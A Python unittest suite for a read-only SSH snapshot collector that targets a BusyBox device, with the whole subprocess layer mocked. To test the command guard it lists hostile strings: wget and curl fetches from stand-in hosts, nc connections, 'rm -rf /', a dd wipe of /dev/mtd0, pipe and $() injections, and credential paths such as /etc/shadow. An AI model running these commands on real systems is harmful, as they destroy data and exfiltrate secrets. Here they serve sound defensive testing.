#!/usr/bin/env python3
"""Offline unit tests for collect_box_snapshot (standard library only).

Every test fully mocks the subprocess/SSH layer: no network access, no ssh
execution, no contact with the box, ever.  The fakes raise on any command
the closed guard would not itself have approved, and the suites prove:

  * dry-run performs ZERO subprocess calls and emits a guard-valid plan;
  * every primary and no-dash BusyBox fallback builder is accepted with
    exactly one separator space, and malicious/excluded commands are
    rejected before any invocation;
  * the allowlist is closed: excluded paths and cross-family escapes
    cannot become argv;
  * benign dotfiles are classified hidden (excluded, run stays complete)
    while unsafe dotfiles/metacharacter names fail closed;
  * symlinks are never cat-ed, regular files are hashed locally and the
    manifest is byte-deterministic across runs;
  * outputs are restrictive-mode and atomic (no temp leftovers);
  * collection-record.json exit_code matches the process exit code for
    success (0), incomplete (1), and fatal (2) runs;
  * forbidden tokens (http/scp/sftp/remote-write verbs) never appear in
    any executed argv.

Run:  python3 -m unittest discover -s tools/reconciliation -p "test_*.py" -v
"""

import hashlib
import io
import json
import os
import sys
import tempfile
import unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
if HERE not in sys.path:
    sys.path.insert(0, HERE)

import collect_box_snapshot as cbss  # noqa: E402

FIXED = sorted(cbss.FIXED_FILE_PATHS)
SYMLINKS = {
    "/data/codex/bin/dropbear": "/usr/sbin/dropbear",
    "/data/codex/bin/dropbearkey": "/usr/sbin/dropbearkey",
    "/cache/bin/bthid_keyboard": "/usr/bin/bthid_keyboard",
}
CONTENTS = {p: ("# box snapshot content: %s\n" % p).encode() for p in FIXED}
CONTENTS["/data/codex/bin/harmony-agent"] = b"#!/bin/sh\necho dynamic agent\n"
HAPPY_ENUMERATION = ".\n..\ndropbear\ndropbearkey\nharmony-agent\n"

#: Exact BusyBox `ls -ldn` lines observed on the box (no date column).
OBSERVED_NO_DATE_REGULAR = (
    b"-rw-r--r--    1 0        0             749 /data/codex/bin/MANIFEST.txt")
OBSERVED_NO_DATE_EXEC = (
    b"-rwxr-xr-x    1 0        0          111796 /data/codex/bin/codex_bt_pair_agent")
OBSERVED_NO_DATE_SYMLINK = (
    b"lrwxrwxrwx    1 0        0              36 /cache/bin/bthid_keyboard"
    b" -> /data/codex/bin/codex_bthid_keyboard")

#: Contents whose lengths match the observed no-date ls sizes exactly
#: (the collector cross-checks ls size against streamed byte count).
NODATE_MANIFEST_TXT = b"m" * 749
NODATE_PAIR_AGENT = b"e" * 111796
NO_DATE_ENUMERATION = (
    ".\n..\ndropbear\ndropbearkey\nMANIFEST.txt\ncodex_bt_pair_agent\n")
#: Symlink mapping matching the observed no-date lines (bthid points at
#: the dynamic agent path, not /usr/bin).
NO_DATE_SYMLINKS = dict(SYMLINKS)
NO_DATE_SYMLINKS["/cache/bin/bthid_keyboard"] = "/data/codex/bin/codex_bthid_keyboard"

MTIME_EPOCH = 1723882000


# ---------------------------------------------------------------------------
# Fully mocked subprocess / SSH layer
# ---------------------------------------------------------------------------


class FakeCompletedProcess:
    def __init__(self, returncode, stdout, stderr):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr


class FakePopen:
    """Stand-in for subprocess.Popen used only for `cat -- <path>`."""

    def __init__(self, argv, stdout_bytes, rc=0):
        self.argv = list(argv)
        self._stream = io.BytesIO(stdout_bytes)
        self.stdout = self._stream
        self._rc = rc
        self._killed = False

    def wait(self, timeout=None):
        return self._rc

    def kill(self):
        self._killed = True


class FakeSubprocess:
    """Module-like fake replacing collect_box_snapshot.subprocess entirely."""

    DEVNULL = -3
    PIPE = -2

    class TimeoutExpired(Exception):
        pass

    def __init__(self, script=None, raise_on=(), fail_on_any=False):
        self.script = dict(script or {})
        self.raise_on = set(raise_on)
        self.fail_on_any = fail_on_any
        self.run_calls = []
        self.popen_calls = []

    def _lookup(self, cmd):
        if cmd in self.raise_on:
            raise OSError("cannot execute ssh binary (simulated)")
        if cmd not in self.script:
            raise AssertionError(
                "fake ssh received a command outside its script: %r" % (cmd,)
            )
        return self.script[cmd]

    def run(self, argv, capture_output=True, timeout=None, check=False, stdin=None):
        if self.fail_on_any:
            raise AssertionError("subprocess.run must not be called in this test")
        self.run_calls.append(list(argv))
        rc, out, err = self._lookup(argv[-1])
        return FakeCompletedProcess(rc, out, err)

    def Popen(self, argv, stdout=None, stderr=None, stdin=None):
        if self.fail_on_any:
            raise AssertionError("subprocess.Popen must not be called in this test")
        self.popen_calls.append(list(argv))
        rc, out, err = self._lookup(argv[-1])
        if stderr is not None and err:
            stderr.write(err)
        return FakePopen(argv, out, rc=rc)

    def all_commands(self):
        return [argv[-1] for argv in self.run_calls + self.popen_calls]

    def all_argv(self):
        return self.run_calls + self.popen_calls


def ls_line(path, *, ftype="-", size=None, target=None):
    if ftype == "symlink":
        assert target is not None, "symlink ls lines require a target"
        mode = "lrwxrwxrwx"
        size = len(target) if size is None else size
        rest = "%s -> %s" % (path, target)
    else:
        mode = {"-": "-rw-r--r--", "regular": "-rw-r--r--",
                "directory": "drwxr-xr-x"}[ftype]
        rest = path
    return ("%s    1 0        0            %5d Aug 17 10:00 %s" % (mode, size, rest)).encode()


def ls_line_nodate(path, *, ftype="-", size=None, target=None):
    """BusyBox no-date form: mode nlink owner group size rest (no date)."""
    if ftype == "symlink":
        assert target is not None, "symlink ls lines require a target"
        mode = "lrwxrwxrwx"
        size = len(target) if size is None else size
        rest = "%s -> %s" % (path, target)
    else:
        mode = {"-": "-rw-r--r--", "regular": "-rw-r--r--",
                "exec": "-rwxr-xr-x", "directory": "drwxr-xr-x"}[ftype]
        rest = path
    return ("%s    1 0        0            %5d %s" % (mode, size, rest)).encode()


def make_nodate_busybox_script(enumeration=NO_DATE_ENUMERATION):
    """Old-BusyBox environment: no-date ls lines, stat/md5sum/readlink absent.

    Symlink targets therefore come from the ls line (`ls-fallback` source).
    Tests override individual entries (e.g. readlink) as needed.
    """
    script = {}
    script[cbss.cmd_enumerate()] = (0, enumeration.encode(), b"")

    files = dict(CONTENTS)
    files["/data/codex/bin/MANIFEST.txt"] = NODATE_MANIFEST_TXT
    files["/data/codex/bin/codex_bt_pair_agent"] = NODATE_PAIR_AGENT
    for path, data in files.items():
        script[cbss.cmd_ls(path)] = (0, ls_line_nodate(path, size=len(data)), b"")
        script[cbss.cmd_stat(path)] = (127, b"", b"stat: applet not found\n")
        script[cbss.cmd_md5sum(path)] = (127, b"", b"md5sum: applet not found\n")
        script[cbss.cmd_cat(path)] = (0, data, b"")
    for path, target in NO_DATE_SYMLINKS.items():
        script[cbss.cmd_ls(path)] = (
            0, ls_line_nodate(path, ftype="symlink", target=target), b"")
        script[cbss.cmd_readlink(path)] = (127, b"", b"readlink: applet not found\n")
    return script


def make_happy_script(enumeration=HAPPY_ENUMERATION, *, fail_primaries=False,
                      stat_rc=0, md5_rc=0, ls_override=None, md5_override=None,
                      stat_override=None, extra_contents=None, symlink_lines=None):
    """Build a command->(rc, stdout, stderr) script for a complete run."""
    script: dict = {}

    def put(cmd, rc, out=b"", err=b""):
        script[cmd] = (rc, out, err)

    def entry(ok_out):
        # Primary form result: (rc, out, err) - success or BusyBox rejection.
        if fail_primaries:
            return 1, b"", b"unrecognized option: --\n"
        return 0, ok_out, b""

    put(cbss.cmd_enumerate(), *entry(enumeration.encode()))
    if fail_primaries:
        put(cbss.cmd_enumerate_nodash(), 0, enumeration.encode())

    contents = dict(CONTENTS)
    if extra_contents:
        contents.update(extra_contents)

    for path in FIXED:
        data = contents[path]
        out = ls_line(path, size=len(data))
        if ls_override is not None:
            out = ls_override(path, out)
        put(cbss.cmd_ls(path), *entry(out))
        if fail_primaries:
            put(cbss.cmd_ls_nodash(path), 0, out)
        if stat_rc == 0:
            stat_out = b"%d %d 0 0 1" % (len(data), MTIME_EPOCH)
            if stat_override is not None:
                stat_out = stat_override(path, stat_out)
            put(cbss.cmd_stat(path), 0, stat_out)
            if fail_primaries:
                put(cbss.cmd_stat_nodash(path), 0, stat_out)
        else:
            put(cbss.cmd_stat(path), stat_rc, b"", b"stat: applet not found\n")
            put(cbss.cmd_stat_nodash(path), stat_rc, b"", b"stat: applet not found\n")
        if md5_rc == 0:
            md5_out = (hashlib.md5(data).hexdigest() + "  " + path).encode()
            if md5_override is not None:
                md5_out = md5_override(path, md5_out)
            put(cbss.cmd_md5sum(path), 0, md5_out)
            if fail_primaries:
                put(cbss.cmd_md5sum_nodash(path), 0, md5_out)
        else:
            put(cbss.cmd_md5sum(path), md5_rc, b"", b"md5sum: applet not found\n")
            put(cbss.cmd_md5sum_nodash(path), md5_rc, b"", b"md5sum: applet not found\n")
        put(cbss.cmd_cat(path), 0, data)

    for path, target in SYMLINKS.items():
        out = ls_line(path, ftype="symlink", target=target)
        if symlink_lines is not None:
            out = symlink_lines(path, out)
        put(cbss.cmd_ls(path), *entry(out))
        if fail_primaries:
            put(cbss.cmd_ls_nodash(path), 0, out)
        put(cbss.cmd_readlink(path), *entry((target + "\n").encode()))
        if fail_primaries:
            put(cbss.cmd_readlink_nodash(path), 127, b"", b"readlink: applet not found\n")

    agent = "/data/codex/bin/harmony-agent"
    if agent in contents:
        data = contents[agent]
        put(cbss.cmd_ls(agent), *entry(ls_line(agent, size=len(data))))
        if fail_primaries:
            put(cbss.cmd_ls_nodash(agent), 0, ls_line(agent, size=len(data)))
        if stat_rc == 0:
            put(cbss.cmd_stat(agent), 0, b"%d %d 0 0 1" % (len(data), MTIME_EPOCH))
            if fail_primaries:
                put(cbss.cmd_stat_nodash(agent), 0, b"%d %d 0 0 1" % (len(data), MTIME_EPOCH))
        else:
            put(cbss.cmd_stat(agent), stat_rc, b"", b"stat: applet not found\n")
            put(cbss.cmd_stat_nodash(agent), stat_rc, b"", b"stat: applet not found\n")
        if md5_rc == 0:
            put(cbss.cmd_md5sum(agent), 0, (hashlib.md5(data).hexdigest() + "  " + agent).encode())
            if fail_primaries:
                put(cbss.cmd_md5sum_nodash(agent), 0,
                    (hashlib.md5(data).hexdigest() + "  " + agent).encode())
        else:
            put(cbss.cmd_md5sum(agent), md5_rc, b"", b"md5sum: applet not found\n")
            put(cbss.cmd_md5sum_nodash(agent), md5_rc, b"", b"md5sum: applet not found\n")
        put(cbss.cmd_cat(agent), 0, data)
    return script


# ---------------------------------------------------------------------------
# Test base
# ---------------------------------------------------------------------------


class CollectorTestBase(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory(prefix="boxsnap-test-")
        self.addCleanup(tmp.cleanup)
        self.tmp = tmp.name
        self.identity = os.path.join(self.tmp, "id_box")
        with open(self.identity, "wb") as fh:
            fh.write(b"FAKE-KEY-MATERIAL\n")
        os.chmod(self.identity, 0o600)
        self.known_hosts = os.path.join(self.tmp, "known_hosts")
        with open(self.known_hosts, "wb") as fh:
            fh.write(b"|1|fake|hostkey\n")

    def install_fake(self, script=None, raise_on=(), fail_on_any=False):
        fake = FakeSubprocess(script, raise_on=raise_on, fail_on_any=fail_on_any)
        self.fake = fake
        patcher_sub = mock.patch.object(cbss, "subprocess", fake)
        patcher_which = mock.patch.object(cbss.shutil, "which", lambda b: "/usr/bin/ssh")
        patcher_sub.start()
        patcher_which.start()
        self.addCleanup(patcher_sub.stop)
        self.addCleanup(patcher_which.stop)
        return fake

    def base_argv(self, out_dir, extra=()):
        return [
            "--host", "192.0.2.123",
            "--user", "testuser",
            "--identity", self.identity,
            "--known-hosts", self.known_hosts,
            "--out-dir", out_dir,
            "--timestamp", "2026-08-17T00:00:00Z",
        ] + list(extra)

    def run_collector(self, script, extra=(), out_name="out"):
        self.install_fake(script)
        out_dir = os.path.join(self.tmp, out_name)
        rc = cbss.main(self.base_argv(out_dir, extra))
        return rc, out_dir

    def read_json(self, out_dir, name):
        with open(os.path.join(out_dir, name), "r", encoding="utf-8") as fh:
            return json.load(fh)

    def assert_forbidden_tokens_absent(self, fake):
        forbidden = [
            "http://", "https://", "scp", "sftp", "curl", "wget", "nc ",
            ";", "|", "&&", ">", "<", "`", "$(", "rm ", "mkdir", "chmod ",
            "touch ", "mv ", "cp ", "install", "kill", "reboot", "sync",
            "tee", "dd ", ">>",
        ]
        for argv in fake.all_argv():
            joined = "\x00".join(argv)
            for token in forbidden:
                self.assertNotIn(token, joined, "forbidden token %r in argv %r" % (token, argv))
            self.assertEqual(os.path.basename(argv[0]), "ssh")

    def guard_allowed_from_manifest(self, manifest):
        file_paths = {e["path"] for e in manifest["entries"] if e["kind"] == "file"}
        symlink_paths = {e["path"] for e in manifest["entries"] if e["kind"] == "symlink"}
        return {
            "ls": file_paths | symlink_paths | {cbss.DYNAMIC_DIR},
            "stat": file_paths,
            "md5sum": file_paths,
            "cat": file_paths,
            "readlink": symlink_paths,
        }


# ---------------------------------------------------------------------------
# Guard tests (pure, no subprocess at all)
# ---------------------------------------------------------------------------


class GuardTests(unittest.TestCase):
    def base_allowed(self, **dynamic):
        allowed = {
            "ls": set(cbss.FIXED_FILE_PATHS) | set(cbss.EXPECTED_SYMLINK_PATHS)
            | {cbss.DYNAMIC_DIR},
            "stat": set(cbss.FIXED_FILE_PATHS),
            "readlink": set(cbss.EXPECTED_SYMLINK_PATHS),
            "md5sum": set(cbss.FIXED_FILE_PATHS),
            "cat": set(cbss.FIXED_FILE_PATHS),
        }
        for verb, paths in dynamic.items():
            allowed[verb] |= set(paths)
        return allowed

    def test_approved_builders_parameterized(self):
        """Every primary AND no-dash fallback builder passes the guard."""
        allowed = self.base_allowed(
            ls=["/data/codex/bin/harmony-agent"],
            readlink=["/data/codex/bin/harmony-agent"],
        )
        cases = [
            ("cmd_enumerate", lambda _p: cbss.cmd_enumerate(), "ls", [cbss.DYNAMIC_DIR]),
            ("cmd_enumerate_nodash", lambda _p: cbss.cmd_enumerate_nodash(), "ls", [cbss.DYNAMIC_DIR]),
            ("cmd_ls", cbss.cmd_ls, "ls", FIXED + sorted(SYMLINKS) + ["/data/codex/bin/harmony-agent"]),
            ("cmd_ls_nodash", cbss.cmd_ls_nodash, "ls", FIXED + sorted(SYMLINKS) + ["/data/codex/bin/harmony-agent"]),
            ("cmd_ls_names", cbss.cmd_ls_names, "ls", FIXED + sorted(SYMLINKS)),
            ("cmd_ls_names_nodash", cbss.cmd_ls_names_nodash, "ls", FIXED + sorted(SYMLINKS)),
            ("cmd_stat", cbss.cmd_stat, "stat", FIXED),
            ("cmd_stat_nodash", cbss.cmd_stat_nodash, "stat", FIXED),
            ("cmd_readlink", cbss.cmd_readlink, "readlink", sorted(SYMLINKS)),
            ("cmd_readlink_nodash", cbss.cmd_readlink_nodash, "readlink", sorted(SYMLINKS)),
            ("cmd_md5sum", cbss.cmd_md5sum, "md5sum", FIXED),
            ("cmd_md5sum_nodash", cbss.cmd_md5sum_nodash, "md5sum", FIXED),
            ("cmd_cat", cbss.cmd_cat, "cat", FIXED),
        ]
        for name, builder, verb, paths in cases:
            for path in paths:
                with self.subTest(builder=name, path=path):
                    cmd = builder(path)
                    self.assertNotIn("  ", cmd)  # exactly one separator space everywhere
                    got_verb, got_path = cbss.assert_safe_remote_command(cmd, allowed)
                    self.assertEqual(got_verb, verb)
                    self.assertEqual(got_path, path)

    def test_hidden_component_requires_explicit_opt_in(self):
        """Hidden path components are rejected by default and only allowed
        (still charset-locked, still allowlist-bound) with the explicit
        include-hidden opt-in."""
        allowed = self.base_allowed(cat=["/data/codex/bin/.profile"])
        hidden_cmd = cbss.cmd_cat("/data/codex/bin/.profile")
        with self.subTest(mode="default rejects hidden"):
            with self.assertRaises(cbss.SafetyViolation):
                cbss.assert_safe_remote_command(hidden_cmd, allowed)
        with self.subTest(mode="opt-in accepts benign hidden"):
            verb, path = cbss.assert_safe_remote_command(
                hidden_cmd, allowed, allow_hidden_components=True)
            self.assertEqual((verb, path), ("cat", "/data/codex/bin/.profile"))
        for evil in ("/data/codex/bin/..evil", "/data/codex/bin/.;rm",
                     "/data/codex/bin/.x y", "/data/codex/bin/..."):
            with self.subTest(mode="opt-in still rejects unsafe", path=evil):
                with self.assertRaises(cbss.SafetyViolation):
                    cbss.assert_safe_remote_command(
                        cbss.cmd_cat(evil), allowed, allow_hidden_components=True)
    def test_malicious_and_malformed_commands_rejected(self):
        allowed = self.base_allowed()
        p = "/data/codex/init.sh"
        corpus = [
            # unapproved verbs / transports
            "sh -c 'rm -rf /'",
            "bash -c 'touch /x'",
            "scp /tmp/x root@box:/tmp/x",
            "sftp root@box",
            "curl http://192.0.2.123/payload",
            "wget https://evil.invalid/x",
            "nc 10.0.0.1 4444",
            "rm -rf /",
            "mkdir /data/pwn",
            "chmod 777 /data",
            "reboot",
            "kill 1",
            "sync",
            "mv /a /b",
            "cp /a /b",
            "install /a /b",
            "tee /etc/passwd",
            "dd if=/dev/zero of=/dev/mtd0",
            # metacharacter injection against approved verbs
            "cat -- '" + p + "'; rm -rf /",
            "cat -- '" + p + "' | nc 10.0.0.1 4444",
            "cat -- '" + p + "' > /tmp/leak",
            "cat -- '" + p + "' >> /tmp/leak",
            "cat -- '" + p + "' && touch /tmp/x",
            "cat -- '$(rm -rf /)'",
            "cat -- '`rm -rf /`'",
            "cat -- '" + p + "'\nrm -rf /",
            "cat -- '" + p + "'\trm",
            "cat -- \"$(reboot)\"",
            # malformed approved-verb forms
            "cat '" + p + "'",                       # missing --
            "cat -- " + p,                           # unquoted path
            "cat -- '" + p + "' '" + p + "'",        # extra argument
            "cat  -- '" + p + "'",                   # double space in head
            "cat --  '" + p + "'",                   # two separator spaces
            "ls -ldn  '" + p + "'",                  # two separator spaces
            "ls '" + p + "'",                        # ls without approved flags
            "ls -ladi '" + p + "'",                  # unapproved flags
            "ls -ldn -- '" + p + "' extra",          # trailing junk
            "ls -ldn -- '" + p + "'\n",              # trailing newline
            "readlink -f -- '/data/codex/bin/dropbear'",
            "readlink -f '/data/codex/bin/dropbear'",
            "md5sum -c -- '" + p + "'",
            "md5sum -c '" + p + "'",
            "stat -c '%s' -- '" + p + "'",           # unpinned format
            "stat -c '%s %Y %u %g %h %n' -- '" + p + "'",  # extra format field
            "stat -c 'rm -rf /' -- '" + p + "'",
            "stat -- '" + p + "'",                   # missing -c
            # quoting games
            "cat -- ''",
            "cat -- '""'",
            "ls -ldn -- '/data/codex/init.sh' '/etc/shadow'",
            "ls -ldn -- '/etc/shadow' '" + p + "'",
            "stat -c '%s %Y %u %g %h' -- '" + p + "' -- '/etc/shadow'",
        ]
        for cmd in corpus:
            with self.subTest(cmd=cmd):
                with self.assertRaises(cbss.SafetyViolation):
                    cbss.assert_safe_remote_command(cmd, allowed)

    def test_excluded_and_escaping_paths_rejected(self):
        allowed = self.base_allowed()
        excluded = [
            "/etc/shadow", "/etc/passwd", "/root/.ssh/authorized_keys",
            "/data/codex", "/data/codex/bin/../../etc/shadow",
            "/data/codex/init.sh\x00", "/data/codex/init.sh;rm",
            "/data/codex/init.sh extra", "/tmp/x", "/home/u/x",
            "/data/codex/init.sh/", "//data/codex/init.sh",
            "relative/path", "/data/codex/-dashfile", "/data/codex/.h/idx",
        ]
        for path in excluded:
            for builder in (cbss.cmd_ls_nodash, cbss.cmd_cat, cbss.cmd_md5sum_nodash):
                with self.subTest(path=path, builder=builder.__name__):
                    with self.assertRaises(cbss.SafetyViolation):
                        cbss.assert_safe_remote_command(builder(path), allowed)

    def test_family_closure(self):
        """A path allowlisted for one family cannot be invoked via another."""
        allowed = self.base_allowed()
        cases = [
            # fixed file via readlink (readlink family is symlink-only)
            (cbss.cmd_readlink("/data/codex/init.sh"), "readlink on fixed file"),
            (cbss.cmd_readlink_nodash("/data/codex/init.sh"), "readlink nodash on fixed file"),
            # expected symlink via cat/stat/md5sum (content families are file-only)
            (cbss.cmd_cat("/data/codex/bin/dropbear"), "cat on expected symlink"),
            (cbss.cmd_stat("/cache/bin/bthid_keyboard"), "stat on expected symlink"),
            (cbss.cmd_md5sum("/data/codex/bin/dropbearkey"), "md5sum on expected symlink"),
            # dynamic dir is enumerable by ls only
            (cbss.cmd_cat(cbss.DYNAMIC_DIR), "cat on dynamic dir"),
            (cbss.cmd_stat(cbss.DYNAMIC_DIR), "stat on dynamic dir"),
        ]
        for cmd, label in cases:
            with self.subTest(label=label):
                with self.assertRaises(cbss.SafetyViolation):
                    cbss.assert_safe_remote_command(cmd, allowed)

    def test_dynamic_basename_classification(self):
        benign_hidden = [".profile", ".bashrc", ".config2", ".a+b-c_d.e"]
        accepted = ["harmony-agent", "init.sh", "x", "A0._+-"]
        unsafe = [
            "..", ".", "...", "..evil", ".;rm", ".x y", ".|pipe", ".$(x)",
            "-dash", "a;b", "a b", "a|b", "a>b", "a`b`", "a$(b)", "a\\b",
            "a\nb", "a\tb", "café", "", "x" * 256,
        ]
        for name in benign_hidden:
            with self.subTest(name=name):
                self.assertEqual(cbss.classify_dynamic_name(name)[0], "hidden")
        for name in accepted:
            with self.subTest(name=name):
                self.assertEqual(cbss.classify_dynamic_name(name)[0], "accept")
        for name in unsafe:
            with self.subTest(name=name):
                self.assertEqual(cbss.classify_dynamic_name(name)[0], "unsafe")


# ---------------------------------------------------------------------------
# Observed BusyBox no-date ls lines (regression for the live failure)
# ---------------------------------------------------------------------------


class ObservedBusyBoxLineTests(unittest.TestCase):
    """Regression tests using the EXACT ls lines observed on the box."""

    def test_exact_observed_regular_line_parses(self):
        meta = cbss.parse_ls_line(
            OBSERVED_NO_DATE_REGULAR.decode("utf-8"), "/data/codex/bin/MANIFEST.txt")
        self.assertEqual(meta["mode"], "-rw-r--r--")
        self.assertEqual(meta["file_type"], "regular")
        self.assertEqual(meta["type_char"], "-")
        self.assertEqual(meta["nlink"], 1)
        self.assertEqual(meta["uid"], 0)
        self.assertEqual(meta["gid"], 0)
        self.assertIsNone(meta["owner_name"])  # numeric owners parsed as uid
        self.assertIsNone(meta["group_name"])
        self.assertEqual(meta["size"], 749)
        self.assertIsNone(meta["mtime_raw"])   # no-date form: mtime_raw is null
        self.assertIsNone(meta["ls_target"])
        self.assertEqual(meta["ls_raw"], OBSERVED_NO_DATE_REGULAR.decode("utf-8"))

    def test_exact_observed_executable_line_parses(self):
        meta = cbss.parse_ls_line(
            OBSERVED_NO_DATE_EXEC.decode("utf-8"), "/data/codex/bin/codex_bt_pair_agent")
        self.assertEqual(meta["mode"], "-rwxr-xr-x")
        self.assertEqual(meta["file_type"], "regular")
        self.assertEqual(meta["size"], 111796)
        self.assertIsNone(meta["mtime_raw"])
        self.assertIsNone(meta["ls_target"])

    def test_exact_observed_symlink_line_parses(self):
        meta = cbss.parse_ls_line(
            OBSERVED_NO_DATE_SYMLINK.decode("utf-8"), "/cache/bin/bthid_keyboard")
        self.assertEqual(meta["mode"], "lrwxrwxrwx")
        self.assertEqual(meta["file_type"], "symlink")
        self.assertEqual(meta["size"], 36)  # length of the target string
        self.assertIsNone(meta["mtime_raw"])
        self.assertEqual(meta["ls_target"], "/data/codex/bin/codex_bthid_keyboard")

    def test_malicious_and_ambiguous_rest_rejected(self):
        base = OBSERVED_NO_DATE_REGULAR.decode("utf-8")
        path = "/data/codex/bin/MANIFEST.txt"
        cases = [
            # trailing junk after the path
            (base + " evil", path),
            # arrow junk appended to a regular-file line
            (base + " -> /etc/passwd", path),
            # rest names a different (excluded) path
            (base.replace(path, "/etc/shadow"), path),
            # matches BOTH the date form and the no-date form -> ambiguous
            ("-rw-r--r--    1 0        0             749 /data/x a b c", "/data/x"),
            # rest not anchored to '/' (relative first token)
            ("-rw-r--r--    1 0        0             749 relative/path", path),
            # symlink rest not anchored to the expected path
            ("lrwxrwxrwx    1 0        0              36 /other -> /tgt",
             "/cache/bin/bthid_keyboard"),
            # symlink arrow missing entirely
            ("lrwxrwxrwx    1 0        0              36 /cache/bin/bthid_keyboard",
             "/cache/bin/bthid_keyboard"),
            # non-numeric garbage in numeric columns
            ("-rw-r--r--    x 0        0             749 " + path, path),
            ("-rw-r--r--    1 0        0             xxx " + path, path),
            # unknown type char
            ("xrwxrwxrwx    1 0        0               7 " + path, path),
        ]
        for line, expected in cases:
            with self.subTest(line=line):
                with self.assertRaises(cbss.MetadataViolation):
                    cbss.parse_ls_line(line, expected)

    def test_names_with_spaces_rejected(self):
        """Whitespace never survives: expected paths with spaces are refused
        outright, and rest fields containing spaces never equal a safe path."""
        with self.subTest(case="expected path contains whitespace"):
            with self.assertRaises(cbss.MetadataViolation):
                cbss.parse_ls_line(
                    "-rw-r--r--    1 0        0             749 /data/codex/bin/MANI FEST.txt",
                    "/data/codex/bin/MANI FEST.txt")
        with self.subTest(case="space-bearing rest mismatches safe expected path"):
            with self.assertRaises(cbss.MetadataViolation):
                cbss.parse_ls_line(
                    "-rw-r--r--    1 0        0             749 /data/codex/bin/MANI FEST.txt",
                    "/data/codex/bin/MANIFEST.txt")
        with self.subTest(case="enumerated space names never reach ls at all"):
            # classify_dynamic_name is the gate before any invocation
            self.assertEqual(cbss.classify_dynamic_name("MANI FEST.txt")[0], "unsafe")
            self.assertEqual(cbss.classify_dynamic_name("codex bt")[0], "unsafe")

    def test_date_form_still_parses_unchanged(self):
        """The pre-existing date form keeps working (no regression)."""
        line = ("-rw-r--r--    1 0        0               31 "
                "Aug 17 10:00 /data/codex/init.sh")
        meta = cbss.parse_ls_line(line, "/data/codex/init.sh")
        self.assertEqual(meta["size"], 31)
        self.assertEqual(meta["mtime_raw"], "Aug 17 10:00")
        self.assertIsNone(meta["ls_target"])
        symlink = ("lrwxrwxrwx    1 0        0               36 "
                   "Aug 17 10:00 /data/codex/bin/dropbear -> /usr/sbin/dropbear")
        meta2 = cbss.parse_ls_line(symlink, "/data/codex/bin/dropbear")
        self.assertEqual(meta2["ls_target"], "/usr/sbin/dropbear")
        self.assertEqual(meta2["mtime_raw"], "Aug 17 10:00")


# ---------------------------------------------------------------------------
# Dry-run tests
# ---------------------------------------------------------------------------


class DryRunTests(CollectorTestBase):
    def test_dry_run_makes_zero_subprocess_calls(self):
        self.install_fake(fail_on_any=True)
        out_dir = os.path.join(self.tmp, "must-not-exist")
        buf = io.StringIO()
        with mock.patch("sys.stdout", buf):
            rc = cbss.main(self.base_argv(out_dir, ["--dry-run"]))
        self.assertEqual(rc, 0)
        self.assertFalse(os.path.exists(out_dir))
        plan = json.loads(buf.getvalue())
        self.assertEqual(plan["schema"], cbss.PLAN_SCHEMA)
        self.assertTrue(plan["dry_run"])
        # Nothing was executed by any code path.
        self.assertEqual(self.fake.run_calls, [])
        self.assertEqual(self.fake.popen_calls, [])

    def test_dry_run_plan_is_guard_valid_and_ssh_argv_pinned(self):
        self.install_fake(fail_on_any=True)
        buf = io.StringIO()
        with mock.patch("sys.stdout", buf):
            rc = cbss.main(self.base_argv("unused", ["--dry-run"]))
        self.assertEqual(rc, 0)
        plan = json.loads(buf.getvalue())
        self.assertGreater(len(plan["planned_invocations"]), 0)

        # Every planned remote command passes the closed guard against the
        # collector's initial allowlists (same construction as __init__).
        allowed = {
            "ls": set(cbss.FIXED_FILE_PATHS) | set(cbss.EXPECTED_SYMLINK_PATHS)
            | {cbss.DYNAMIC_DIR},
            "stat": set(cbss.FIXED_FILE_PATHS),
            "readlink": set(cbss.EXPECTED_SYMLINK_PATHS),
            "md5sum": set(cbss.FIXED_FILE_PATHS),
            "cat": set(cbss.FIXED_FILE_PATHS),
        }
        for inv in plan["planned_invocations"]:
            with self.subTest(purpose=inv["purpose"], path=inv["path"]):
                verb, path = cbss.assert_safe_remote_command(inv["remote_command"], allowed)
                self.assertEqual(verb, inv["verb"])
                self.assertEqual(path, inv["path"])
                argv = inv["argv"]
                self.assertEqual(os.path.basename(argv[0]), "ssh")
                self.assertEqual(argv[-1], inv["remote_command"])
                for opt in cbss.REQUIRED_SSH_OPTIONS:
                    self.assertIn(opt, argv)
                self.assertIn("-T", argv)
                self.assertIn("testuser@192.0.2.123", argv)
                self.assertIn("-F", argv)
                self.assertIn("/dev/null", argv)
                self.assertIn(self.identity, argv)
                self.assertIn("UserKnownHostsFile=" + os.path.abspath(self.known_hosts),
                              argv)

        # Fallback examples in the plan are themselves guard-valid.
        fb = plan["fallback_commands"]
        for cmd in fb["ls"] + fb["stat"] + fb["readlink"] + fb["md5sum"]:
            cbss.assert_safe_remote_command(cmd, allowed)

    def test_dry_run_documents_toctou_residual_risk(self):
        self.install_fake(fail_on_any=True)
        buf = io.StringIO()
        with mock.patch("sys.stdout", buf):
            cbss.main(self.base_argv("unused", ["--dry-run"]))
        plan = json.loads(buf.getvalue())
        self.assertIn("toctou", plan["residual_risks"])
        self.assertIn("same-size swap", plan["residual_risks"]["toctou"])


# ---------------------------------------------------------------------------
# Full collection tests (subprocess fully mocked)
# ---------------------------------------------------------------------------


class CollectionTests(CollectorTestBase):
    def test_happy_path_complete(self):
        rc, out = self.run_collector(make_happy_script())
        self.assertEqual(rc, 0)
        manifest = self.read_json(out, "manifest.json")
        record = self.read_json(out, "collection-record.json")

        self.assertTrue(manifest["complete"])
        self.assertEqual(record["exit_code"], 0)
        self.assertEqual(manifest["counts"]["files"], 12)       # 11 fixed + harmony-agent
        self.assertEqual(manifest["counts"]["symlinks"], 3)
        self.assertEqual(manifest["counts"]["entries"], 15)
        self.assertEqual(manifest["counts"]["objects_published"], 12)
        self.assertEqual(manifest["counts"]["errors"], 0)
        self.assertEqual(manifest["allowlist"]["dynamic_entries"],
                         ["dropbear", "dropbearkey", "harmony-agent"])

        # Local hashing correctness: object digest == sha256 of content.
        entries = {e["path"]: e for e in manifest["entries"]}
        for path, data in CONTENTS.items():
            e = entries[path]
            self.assertEqual(e["sha256"], hashlib.sha256(data).hexdigest())
            obj = os.path.join(out, "objects", "sha256", e["sha256"])
            with open(obj, "rb") as fh:
                self.assertEqual(fh.read(), data)
            self.assertEqual(e["md5_local"], hashlib.md5(data).hexdigest())
            self.assertEqual(e["mtime_epoch"], MTIME_EPOCH)
